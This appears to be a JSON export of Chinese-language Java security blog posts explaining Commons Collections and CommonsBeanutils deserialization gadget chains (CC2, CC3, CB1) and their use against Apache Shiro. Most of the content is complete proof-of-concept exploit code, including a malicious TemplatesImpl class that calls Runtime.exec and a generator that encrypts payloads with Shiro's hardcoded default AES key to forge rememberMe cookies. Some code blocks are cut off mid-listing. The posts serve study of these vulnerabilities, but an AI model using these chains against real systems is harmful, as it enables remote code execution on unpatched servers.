[{"categories":["Java"],"content":"前言为什么CB1会和Shiro扯上关系，前面我们研究Shiro反序列化的时候，使用的是P牛的demo，我们可以看到maven项目里是装了一个CC3.2.1的，如果我把这个依赖删除的话 重新加载maven，可以看到多了一个CB 也就是说，Shiro是依赖于commons-beanutils的，但是我们却不能直接用我们上一篇文章提到的CB1链去打Shiro，看P牛的Java安全漫谈可以知道，有两个坑 serialVersionUID必须一致，也就是说服务端的CB版本得和我们生成POC的CB版本一致 如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通 信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会 根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方 的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患 CB反序列化时需要依赖于CC 报错信息为：Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽 然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections ","date":"2022-10-06","objectID":"/shiro2/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsBeanutils1在Shiro中的利用","uri":"/shiro2/#前言"},{"categories":["Java"],"content":"无须依赖CC的利用链因为之前的报错是： Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] 所以我们去定位到这里，BeanCompare，如果在实例化的时候没有给他传入comparator，那么就会调用这个ComparableComparator.getInstance()也就依赖了CC链 不能用ComparableComparator的话就得找个平替来，需要满足的条件是 实现 java.util.Comparator接口 实现 java.io.Serializable接口 Java、shiro或commons-beanutils自带，且兼容性强 这里idea有个快捷键，在mac下是cmd+alt+b，可以用来寻找实现了这个接口的类 可以找到一个CaseInsensitiveComparator满足条件，他是java.lang.String下的 所以我们在创建BeanComparator对象的时候，就可以把这个String.CASE_INSENSITIVE_ORDER传进去，绕开对于CC的依赖 最后的POC import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CB1pro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\"EvilTest\"); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } ","date":"2022-10-06","objectID":"/shiro2/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsBeanutils1在Shiro中的利用","uri":"/shiro2/#无须依赖cc的利用链"},{"categories":["Java"],"content":"前言Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法 JavaBean就不多说了，搞过一点javaweb开发都知道的，commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，比如： PropertyUtils.getProperty(new Cat(), \"name\"); ","date":"2022-10-06","objectID":"/cb1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsBeanutils1利用链分析","uri":"/cb1/#前言"},{"categories":["Java"],"content":"CB链分析CB链的触发是在org.apache.commons.beanutils.BeanComparator，是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了 java.util.Comparator 接口 我们看一下他的源码，如果property不为null，那么就会执行PropertyUtils.getProperty调用JavaBean的getter方法去获取值来执行internalCompare，跟进internalCompare，会执行compare方法 public int compare(T o1, T o2) { if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\"IllegalAccessException: \" + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\"InvocationTargetException: \" + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\"NoSuchMethodException: \" + var7.toString()); } } } private int internalCompare(Object val1, Object val2) { Comparator c = this.comparator; return c.compare(val1, val2); } 而前面说了PropertyUtils.getProperty会自动执行JavaBean的getter方法，而我们的TemplatesImpl的利用链里面，我们之前一直说的是触发TemplatesImpl#newTransformer()，但是其实newTransformer上面还有一层：TemplatesImpl#getOutputProperties() 这是符合JavaBean的getter的定义的，那么我们就可以连接上CC2链子了 ","date":"2022-10-06","objectID":"/cb1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsBeanutils1利用链分析","uri":"/cb1/#cb链分析"},{"categories":["Java"],"content":"利用链构造首先是创建TemplatesImpl ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\"EvilTest\"); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); 然后创建BeanComparator和PriorityQueue，因为要把TemplatesImpl对象传入BeanComparator进行比较 所以得把emplatesImpl对象传入传入PriorityQueue的queue 把BeanComparator传入PriorityQueue的comparator 然后就是CB的核心点，我们得把property传值为outputProperties，这样调用getProperty就会触发到TemplatesImpl#getOutputProperties()进入到利用链 BeanComparator comparator = new BeanComparator(); PriorityQueue queue = new PriorityQueue(2, comparator); // stub data for replacement later queue.add(1); queue.add(1); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); 到这里CB链就构造完成了，下面就可以序列化PriorityQueue对象了 最后的POC import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CB1 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\"EvilTest\"); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(); PriorityQueue queue = new PriorityQueue(2, comparator); // stub data for replacement later queue.add(1); queue.add(1); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } ","date":"2022-10-06","objectID":"/cb1/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsBeanutils1利用链分析","uri":"/cb1/#利用链构造"},{"categories":["Java"],"content":"前言Apache Commons Collections有以下两 个分⽀版本： commons-collections:commons-collections org.apache.commons:commons-collections4 前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后者是官⽅在2013年推出的4版本，当时版本号是4.0 那么他们有啥区别呢，因为我们是在研究CC反序列化链，所以我就从序列化链的角度来看 区别就是LazyMap.decorate 这个⽅法没了，但其实CC4也是有的，叫做LazyMap.lazyMap，我们把原来CC3的POC换成这个也是可以成功反序列化的 ","date":"2022-10-05","objectID":"/cc4/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections4链分析","uri":"/cc4/#前言"},{"categories":["Java"],"content":"CC2ysoserial对commons-collections4准备了两个链，一个是CC2一个是CC4 在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从Serializable#readObject() ⽅法到 Transformer#transform() ⽅法的调⽤链 我们看ysoserial的CC2的gadget，可以发现这里用到了一个PriorityQueue和TransformingComparator /* Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() */ 我们跟进具体分析一下利用链，首先我们看TransformingComparator，他有个compare方法，会调用transform public int compare(I obj1, I obj2) { O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); } 然后是PriorityQueue#readObject，他重写了readObject private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i \u003c size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \"proper order\", but the // spec has never explained what that might be. heapify(); } 执行了一个heapify()，跟进去，调用了siftDown private void heapify() { for (int i = (size \u003e\u003e\u003e 1) - 1; i \u003e= 0; i--) siftDown(i, (E) queue[i]); } 跟进siftDown，调用了siftDownUsingComparator，这里面调用了compare，这就和前面说的TransformingComparator连接上了 private void siftDownUsingComparator(int k, E x) { int half = size \u003e\u003e\u003e 1; while (k \u003c half) { int child = (k \u003c\u003c 1) + 1; Object c = queue[child]; int right = child + 1; if (right \u003c size \u0026\u0026 comparator.compare((E) c, (E) queue[right]) \u003e 0) c = queue[child = right]; if (comparator.compare(x, (E) c) \u003c= 0) break; queue[k] = c; k = child; } queue[k] = x; } POC编写 首先还是那套 Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), new ConstantTransformer(1) }; // 传入fake防止序列化时执行 Transformer transformerChain = new ChainedTransformer(faketransformer); 然后再创建一个comparator，把transformerChain传进去 Comparator comparator = new TransformingComparator(transformerChain); 实例化PriorityQueue，因为要执行compare，所以得传入2个单位，第二个参数写刚刚的comparator去执行到comparator.compare进而触发TransformingComparator的transform方法 PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); 往transformerChain替换进恶意的transformers setFieldValue(transformerChain, \"iTransformers\", transformers); 最后的POC import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; import static com.sun.xml.internal.xsom.impl.UName.comparator; public class CC2 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })}; Transformer[] transformers = n","date":"2022-10-05","objectID":"/cc4/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections4链分析","uri":"/cc4/#cc2"},{"categories":["Java"],"content":"CC2与TemplatesImpl前面说了Shiro这里不能有数组，所以这里我们再试试用TemplatesImpl来构造POC import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class CC2pro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\"EvilTest\"); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); // 无害transformer防止构造时触发 Transformer transformer = new InvokerTransformer(\"toString\", null, null); Comparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2,comparator); queue.add(obj); queue.add(obj); setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } 有点区别的是这里，我们的queue.add(obj)，为什么不能add(1)了 因为我们用了TemplatesImpl取代了ChainedTransformer，所以得找个办法传入参数，而这里的add就是一个传入参数的点，可以调试到，最后执行transform的时候，里面传的参数就是我们add进去的值 所以我们传入TemplatesImpl对象，就会变成这样，成功进入TemplatesImpl的newTransformer ","date":"2022-10-05","objectID":"/cc4/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections4链分析","uri":"/cc4/#cc2与templatesimpl"},{"categories":["Java"],"content":"测试环境搭建我这里用的是P牛的JavaThings，这里有一个Maven构建的非常简易的Shiro的应用 这里用idea打开，然后构建Maven项目，构建好以后简历一个Tomcat服务器就可以使用了 直接访问localhost:8080 我找了好久没找到相关的登录代码逻辑，后来发现，这个项目根本没写，只是在shiro.ini文件里写了就够了 [main] shiro.loginUrl = /login.jsp [users] # format: username = password, role1, role2, ..., roleN root = secret,admin guest = guest,guest [roles] # format: roleName = permission1, permission2, ..., permissionN admin = * [urls] # The /login.jsp is not restricted to authenticated users (otherwise no one could log in!), but # the 'authc' filter must still be specified for it so it can process that url's # login submissions. It is 'smart' enough to allow those requests through as specified by the # shiro.loginUrl above. /login.jsp = authc /logout = logout /** = user 我们用root/secret登录，勾选上rememberme，登录进去就可以看到有rememberMe的cookie了 ","date":"2022-10-03","objectID":"/shiro1/:0:0","series":null,"tags":null,"title":"[Java安全] Shiro反序列化CC链漏洞","uri":"/shiro1/#测试环境搭建"},{"categories":["Java"],"content":"Shiro反序列化","date":"2022-10-03","objectID":"/shiro1/:0:0","series":null,"tags":null,"title":"[Java安全] Shiro反序列化CC链漏洞","uri":"/shiro1/#shiro反序列化"},{"categories":["Java"],"content":"简介为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。 得到rememberMe的cookie值 –\u003e Base64解码 –\u003e AES解密 –\u003e 反序列化 ","date":"2022-10-03","objectID":"/shiro1/:1:0","series":null,"tags":null,"title":"[Java安全] Shiro反序列化CC链漏洞","uri":"/shiro1/#简介"},{"categories":["Java"],"content":"构建思路那么这样的话，构造POC就非常简单了，只需要base64解码Shiro的key，然后对序列化数据进行AES加密即可得到exp 比如这个demo import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.util.Base64; public class attack1 { public static void main(String[] args) throws Exception { byte[] payload = new CommonsCollections6().getPayload(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); AesCipherService aes = new AesCipherService(); byte[] key = Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payload, key); System.out.printf(ciphertext.toString()); } } 但是这个payload是打不通的，报错了 具体原因是因为不能加载Transformer[]，细节原因不深入探究 总的来说就是：如果shiro反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。 那么我们如何构造才能避免使用Transformer数组呢，这就用到了前面学的TemplatesImpl 上一篇文章我们介绍CC3的时候，用到了TemplatesImpl和InvokerTransformer，但是还是需要用到Transformer数组的 这里有一篇博客介绍到了一个方法去绕过：wh1s3p1g 这里就涉及到了我们CC6的一个关键类TiedMapEntry public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } // ... public Object getValue() { return this.map.get(this.key); } // ... public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } // ... 我们在分析CC6利用链的时候，我们关注的是this.map.get(this.key);里面map触发get方法，对于里面的key我们只是随便传了个值并没去管他 由于不能使用数组，所以ChainedTransformer就不能用了，那么这里我们自然也用不上ConstantTransformer了，那么我们就缺少了一个恶意对象和恶意对象参数的连接效果的东西了 而这里恰好，TiedMapEntry的getValue方法会传入key，如果Map是LazyMap的话，我们会惊喜的发现，key会直接传入，执行transform函数，这个效果就和ConstantTransformer一样的，作为一个恶意对象传递的功能，所以我们只需要把恶意对象传入作为key就可以了 ","date":"2022-10-03","objectID":"/shiro1/:2:0","series":null,"tags":null,"title":"[Java安全] Shiro反序列化CC链漏洞","uri":"/shiro1/#构建思路"},{"categories":["Java"],"content":"构造POC那么现在我们就来构造POC了，这里首先是参考前面的CC3利用TemplatesImpl去加载出一个恶意对象 TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); 然后这里依然是用CC6的来接，构造faketransformer来防止构造时触发链子，但是和CC6的不一样，不能用ChainedTransformer了，所以得手动构造个无害transformer对象 Transformer fakeTransformer = new ConstantTransformer(1); 然后就是加上CC6的链子了，具体看代码注释 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class attack2 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\"EvilTest\"); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); // faketransformer防止构造时触发 Transformer faketransformer = new InvokerTransformer(\"getClass\", null, null); // CC6pro Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, faketransformer); // key传入恶意TemplatesImpl对象 TiedMapEntry tme = new TiedMapEntry(outerMap,obj); HashMap expMap = new HashMap(); expMap.put(tme,\"value\"); outerMap.clear(); //将faketransformer改造，iMethodName换成newTransformer触发链子 setFieldValue(faketransformer, \"iMethodName\", \"newTransformer\"); // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // shiro数据生成 AesCipherService aes = new AesCipherService(); byte[] key = Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key); System.out.printf(ciphertext.toString()); } } 最后我们再写个类去生成字节码去给TemplatesImpl加载 这里用到了javassist，这是一个字节码操纵的第三方库，可以帮助我将恶意类生成字节码再交给 TemplatesImpl ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\"EvilTest\"); byte[] code = clazzz.toBytecode(); 然后再写一个恶意类，因为是要放入TemplatesImpl加载，所以得继承AbstractTranslet import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class EvilTest extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public EvilTest() throws IOException { super(); Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } } 然后运行拿到rememberMe，换上去刷新页面拿到flag**（要把JSESSIONID删掉！！！）** ","date":"2022-10-03","objectID":"/shiro1/:3:0","series":null,"tags":null,"title":"[Java安全] Shiro反序列化CC链漏洞","uri":"/shiro1/#构造poc"},{"categories":["Java"],"content":"总结其实也没啥好说的，就是Shiro的key泄露造成的序列化数据的伪造，个人觉得Shiro太自负了，出现这种隐患不是去修改机制而还是从key的角度去防护，这让Shiro无论哪个版本，只要key泄露了，都会出现反序列化漏洞 然后值得一说的是，Shiro他因为不允许反序列化数组的原因，误打误撞的防御了ysoserial的CC链POC，关于这个的原因，详情可以参考这篇博客 最后我这次构造的POC其实挺曲折的，因为前面抱着侥幸的心里漏学了一些知识，导致都在这里还债了 最后总结一下shiro的CC利用链的构建思路 javassist生成恶意字节码 -\u003e TemplatesImpl -\u003e obj 构建faketransformer = new InvokerTransformer(\"getClass\", null, null) faketransformer -\u003e LazyMap.decorate() -\u003e outMap TiedMapEntry(outMap,obj) -\u003e tme : 等待触发newTransformer 新建HashMap —\u003e tmp -\u003e expMap.put(tme,xxx) : 等待触发get进入CC6链子 把newTransformer插入iMethodName -\u003e setFieldValue : faketransformer转为可用transformer，触发transform可调用newTransformer ","date":"2022-10-03","objectID":"/shiro1/:0:0","series":null,"tags":null,"title":"[Java安全] Shiro反序列化CC链漏洞","uri":"/shiro1/#总结"},{"categories":["Java"],"content":"前言因为一些反序列化的过滤工具的原因，把CC1的InvokeTransformer等给过滤了，所以设计出CC3来绕过⼀些规则对InvokerTransformer的限制 ","date":"2022-10-03","objectID":"/cc3/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections3链分析","uri":"/cc3/#前言"},{"categories":["Java"],"content":"CC1与TemplatesImpl前一篇文章介绍到了TemplatesImpl，那么这里就用上了，我们知道TemplatesImpl的利用链是这样的 TemplatesImpl#newTransformer() -\u003e TemplatesImpl#getTransletInstance() -\u003e TemplatesImpl#defineTransletClasses()-\u003e TransletClassLoader#defineClass() 入口点在newTransformer，那么我们可以利用TemplatesImpl，去连接上我们的CC1链子 看完下面的例子就能懂了 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.*; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CC3 { public static void main(String[] args) throws Exception { byte[] bytes = Base64.getDecoder().decode(\"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBAA5UZW1wQ2xhc3MuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABAAlUZW1wQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAABMABAAUAAwAFQABABAAAAACABE=\"); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,\"_bytecodes\",new byte[][]{bytes}); setFieldValue(templates,\"_name\",\"test\"); setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl()); // templates.newTransformer(); Transformer[] transformers = new Transformer[] { new ConstantTransformer(templates), new InvokerTransformer(\"newTransformer\",null,null) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ","date":"2022-10-03","objectID":"/cc3/:0:0","series":null,"tags":null,"title":"[Java安全] CommonsCollections3链分析","uri":"/cc3/#cc1与templatesimpl"},{"categories":["Java"],"content":"CC3介绍完了CC1和TemplatesImpl，接下来就进行CC3的分析了，在ysoserial的CC3中，可以发现他用了两个新的东西，一个叫TrAXFilter，一个叫InstantiateTransformer 先从TrAXFilter说起，他的构造方法会执行 _transformer = (TransformerImpl) templates.newTransformer(); 所以我们需要找到一个能执行构造方法的，这里就有个InstantiateTransformer完美解决了这个问题，他在执行transform的时候就会进行构造方法的调用 我们构造POC import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CC3 { public static void main(String[] args) throws Exception { byte[] bytes = 